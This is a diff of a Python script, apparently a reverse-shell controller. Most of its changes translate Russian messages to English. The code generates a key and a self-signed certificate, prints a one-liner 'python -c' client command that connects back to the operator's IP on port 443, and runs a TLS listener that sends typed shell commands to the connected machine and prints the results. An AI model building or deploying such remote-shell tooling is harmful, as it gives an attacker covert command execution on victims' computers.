@@ -10,7 +10,7 @@ from Crypto.PublicKey import RSA
 
 def keys_check_or_create(ip_address):
     """
-    Проверяет наличие ключей и сертификатов. Если есть, предлагает использовать существующие.
+    Checks for existing keys and certificates. If found, prompts to use them.
     """
     keys_dir = "keys"
     os.makedirs(keys_dir, exist_ok=True)
@@ -20,25 +20,25 @@ def keys_check_or_create(ip_address):
     cert_path = os.path.join(keys_dir, "server.crt")
 
     if os.path.exists(private_key_path) and os.path.exists(public_key_path) and os.path.exists(cert_path):
-        print("[*] Найдены существующие ключи и сертификат.")
-        use_existing = input("[?] Использовать существующие ключи и сертификат для клиента? (y/n): ").strip().lower()
+        print("[*] Existing keys and certificate found.")
+        use_existing = input("[?] Use existing keys and certificate for the client? (y/n): ").strip().lower()
         if use_existing == "y":
-            print("[*] Используются существующие ключи и сертификат.")
+            print("[*] Using existing keys and certificate.")
             compressed_client_code = generate_and_compress_client_code(ip_address, 443)
-            print("[--- One-Liner Python3 Client Code ---]")
-            print(f"python3 -c \"{compressed_client_code}\"")
+            print("[--- One-Liner Python Client Code ---]")
+            print(f"python -c \"{compressed_client_code}\"")
             print("[--- End of Client Code ---]")
             return cert_path, private_key_path
         else:
-            print("[*] Генерация новых ключей и сертификата.")
+            print("[*] Generating new keys and certificate.")
     else:
-        print("[*] Ключи и сертификаты не найдены. Генерация новых.")
+        print("[*] Keys and certificates not found. Generating new ones.")
 
-    # Генерация новых ключей и сертификата
+    # Generate new keys and certificate
     generate_new_keys_and_certificate(keys_dir, ip_address)
     compressed_client_code = generate_and_compress_client_code(ip_address, 443)
-    print("[--- One-Liner Python3 Client Code ---]")
-    print(f"python3 -c \"{compressed_client_code}\"")
+    print("[--- One-Liner Python Client Code ---]")
+    print(f"python -c \"{compressed_client_code}\"")
     print("[--- End of Client Code ---]")
 
     return cert_path, private_key_path
@@ -46,28 +46,28 @@ def keys_check_or_create(ip_address):
 
 def generate_new_keys_and_certificate(keys_dir, ip_address):
     """
-    Генерирует новые RSA-ключи и самоподписанный сертификат.
+    Generates new RSA keys and a self-signed certificate.
     """
     key = RSA.generate(2048)
 
     private_key_path = os.path.join(keys_dir, "private_key.pem")
     with open(private_key_path, "wb") as f:
         f.write(key.export_key())
-    print("[*] Приватный ключ сгенерирован.")
+    print("[*] Private key generated.")
 
     public_key_path = os.path.join(keys_dir, "public_key.pem")
     with open(public_key_path, "wb") as f:
         f.write(key.publickey().export_key())
-    print("[*] Публичный ключ сгенерирован.")
+    print("[*] Public key generated.")
 
     cert_path = os.path.join(keys_dir, "server.crt")
     generate_certificate(private_key_path, cert_path, ip_address)
-    print("[*] Самоподписанный сертификат сгенерирован.")
+    print("[*] Self-signed certificate generated.")
 
 
 def generate_certificate(private_key_path, cert_path, ip_address):
     """
-    Генерация самоподписанного сертификата.
+    Generates a self-signed certificate.
     """
     openssl_config = "openssl.cnf"
 
@@ -102,9 +102,9 @@ IP.1 = {ip_address}
             "-config", openssl_config
         ]
         run(openssl_command, check=True)
-        print("[*] Сертификат успешно сгенерирован.")
+        print("[*] Certificate successfully generated.")
     except CalledProcessError as e:
-        print(f"[!] Ошибка OpenSSL: {e}")
+        print(f"[!] OpenSSL error: {e}")
     finally:
         if os.path.exists(openssl_config):
             os.remove(openssl_config)
@@ -112,7 +112,7 @@ IP.1 = {ip_address}
 
 def generate_and_compress_client_code(ip, port):
     """
-    Генерация и сжатие клиентского кода.
+    Generates and compresses the client code.
     """
     certfile = os.path.join("keys", "server.crt")
     with open(certfile, "r") as f:
@@ -141,7 +141,7 @@ connect()
 
 def start_server(ip, port=443):
     """
-    Запуск TLS-сервера.
+    Starts the TLS server.
     """
     certfile, keyfile = keys_check_or_create(ip)
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -150,36 +150,36 @@ def start_server(ip, port=443):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.bind((ip, port))
         server_socket.listen(5)
-        print(f"[*] Сервер слушает на {ip}:{port}")
+        print(f"[*] Server listening on {ip}:{port}")
 
         with context.wrap_socket(server_socket, server_side=True) as tls_server:
             try:
                 while True:
                     client_socket, addr = tls_server.accept()
-                    print(f"[+] Подключение от {addr}")
+                    print(f"[+] Connection from {addr}")
                     handle_client(client_socket)
             except KeyboardInterrupt:
-                print("\n[*] Завершение работы сервера.")
+                print("\n[*] Stopping the server.")
                 tls_server.close()
 
 
 def handle_client(client_socket):
     """
-    Обработка команд от клиента.
+    Handles commands from the client.
     """
     buffer_size = 8192
     try:
         while True:
             command = input("Shell> ")
             if command.lower() in ["exit", "quit"]:
-                confirm = input("[?] Завершить работу сервера? (y/n): ").strip().lower()
+                confirm = input("[?] Do you want to shut down the server? (y/n): ").strip().lower()
                 if confirm == "y":
-                    print("[*] Завершение работы сервера.")
+                    print("[*] Shutting down the server.")
                     client_socket.sendall(b"exit")
                     client_socket.close()
-                    exit(0)  # Завершение программы
+                    exit(0)  # Shut down the program
                 else:
-                    print("[*] Сеанс завершён, но сервер продолжает слушать.")
+                    print("[*] Session ended, but the server is still running.")
                     client_socket.sendall(b"exit")
                     client_socket.close()
                     break
@@ -187,14 +187,14 @@ def handle_client(client_socket):
             response = client_socket.recv(buffer_size).decode()
             print(response)
     except Exception as e:
-        print(f"[!] Ошибка: {e}")
+        print(f"[!] Error: {e}")
     finally:
         client_socket.close()
 
 
 if __name__ == "__main__":
-    server_ip = input("[Введите IP-адрес сервера (например, 192.168.1.11)]: ").strip()
+    server_ip = input("[Enter server IP (e.g., 192.168.1.11)]: ").strip()
     if not server_ip:
-        print("[!] IP-адрес обязателен. Завершение.")
+        print("[!] IP address is required. Exiting.")
     else:
         start_server(server_ip, 443)
